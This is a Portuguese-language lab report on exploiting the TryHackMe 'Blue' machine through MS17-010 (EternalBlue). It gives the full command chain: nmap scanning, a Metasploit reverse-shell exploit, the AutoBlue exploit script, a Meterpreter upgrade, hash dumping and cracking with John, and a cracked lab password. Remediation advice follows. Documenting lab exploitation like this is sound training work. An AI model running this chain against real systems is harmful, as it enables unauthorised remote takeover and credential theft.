
# 1 — Visão geral da metodologia

1. **Objetivo:** entregar evidência reprodutível, impacto claro e recomendações acionáveis.
    
2. **Estrutura:** Metadados → Executive Summary → Escopo & Limitações → Metodologia → Evidências / PoC → Impacto & Severidade → Reproduzir passo-a-passo → Recomendações → Apêndice técnico.
    
3. **Princípios:** documentação completa de comandos, resultados e flags.
    

---

# Report — Máquina: `Blue` — `10.64.187.13`

- **Fonte:** THM
    
- **Data:** `2025-11-28`
    
- **Autor:** _[Seu Nome]_
    
- **Nível:** Easy
    
- **Tempo gasto:** _Xh Ym_
    

---

## 1) Executive summary

Vulnerabilidade crítica no SMB (MS17-010 — EternalBlue) permitiu execução remota de código, obtenção de shell e coleta de hashes/flags sem autenticação: **comprometimento total da máquina**.

---

## 2) Escopo e limitações

- **Alvo testado:** `10.64.187.13`
    
- **Ferramentas autorizadas:** Kali Linux, Nmap, Metasploit, AutoBlue-MS17-010, John The Ripper
    
- **Limitações:** sem pivoting, sem DoS, foco apenas em exploração do SMB
    

---

## 3) Metodologia aplicada

- Recon → Nmap
    
- Enumeração → Identificação do SMB vulnerável
    
- Análise → MS17-010 EternalBlue
    
- Exploração → RCE + shell reverse
    
- Pós-exploração → hashdump, cracking, coleta de flags
    
- Reporting → documentação dos passos
    

---

## 4) Achado principal

**Vulnerabilidade:** Execução Remota de Código (MS17-010 — EternalBlue)  
**Serviço afetado:** SMB — portas 445/TCP  
**Prova curta (PoC):**

`python3 eternalblue_exploit7.py 10.64.187.13 shellcode/sc_x64.bin`

**Artefatos obtidos:** Flags 1, 2 e 3 + acesso administrador

---

## 5) Evidências / PoC (resumo)

**Scanner de portas:**

`nmap -Pn -sS -p- -T4 -sV 10.64.187.13 -oN Blue.txt`

**Exploit EternalBlue alternativo:**

`python3 eternalblue_exploit7.py 10.64.187.13 shellcode/sc_x64.bin`

**Handler no Metasploit:**  
multi/handler capturando shell reversa

**Upgrade para Meterpreter:**

`use post/multi/manage/shell_to_meterpreter`

**Flags:**

- Flag 1: Diretório raiz (`C:\`)
    
- Flag 2: `C:\Windows\System32\config`
    
- Flag 3: `C:\Users\Jon\Documents`
    

---

## 6) Impacto & Severidade

**Severidade:** **Alta**  
**Justificativa:** CVE crítico permite execução arbitrária de código com privilégios de sistema, comprometendo totalmente integridade, confidencialidade e disponibilidade da máquina.

---

## 7) Reproduzir (passo-a-passo reprodutível)

1. Scan SMB:
    

`nmap -Pn -sS -p- -T4 -sV 10.64.187.13 -oN Blue.txt`

2. Iniciar Metasploit:
    

`msfconsole use windows/smb/ms17_010_eternalblue set RHOSTS 10.64.187.13 set PAYLOAD windows/x64/shell/reverse_tcp set LHOST <SEU_IP> exploit`

3. Quando falhou o módulo:  
    Clonar AutoBlue:
    

`git clone https://github.com/3ndG4me/AutoBlue-MS17-010 cd AutoBlue-MS17-010/Shellcode ./shell_prep.sh`

4. Executar exploit:
    

`python3 eternalblue_exploit7.py 10.64.187.13 shellcode/sc_x64.bin`

5. No Metasploit → handler recebe shell
    
6. Upgrade:
    

`use post/multi/manage/shell_to_meterpreter run`

7. Dump de hashes:
    

`hashdump`

8. Cracking com John:
    

`john hashes.txt --format=NT`

Senha obtida ⇒ `alqfna22` (usuário **Jon**)  
Administrator ⇒ sem senha

9. Coleta das flags:
    

`flag1 → C:\ flag2 → C:\Windows\System32\config flag3 → C:\Users\Jon\Documents`

---

## 8) Recomendações (para gestores)

- Aplicar imediatamente patches de segurança MS17-010.
    
- Restringir/monitorar SMB na rede interna.
    
- Habilitar firewall e segmentação para serviços legados.
    

---

## 9) Recomendações técnicas (passo-a-passo)

- Atualizar Windows para versão corrigida (março/2017+).
    
- Desabilitar SMBv1:
    

`Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol`

- Aplicar endpoint protection e monitorar logs de execuções anômalas.
    
- Reforçar senhas e políticas de autenticação.
    

---

## 10) Apêndice técnico

### Nmap (execução usada)

`nmap -Pn -sS -p- -T4 -sV 10.64.187.13 -oN Blue.txt`

### Hashdump & cracking

`hashdump john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`

### Exploit externo

- AutoBlue-MS17-010 utilizado devido a bug no módulo MSF
    

### Arquivos

![](Nmap_Blue.txt)

![](Hashes_Blue.txt)

---

## 11) Lições aprendidas / Follow-up

- Confirmar confiabilidade dos módulos do Metasploit antes de uso.
    
- Manter alternativa manual sempre documentada.
    
- Avaliar possíveis movimentos laterais em redes reais após comprometimento.
---
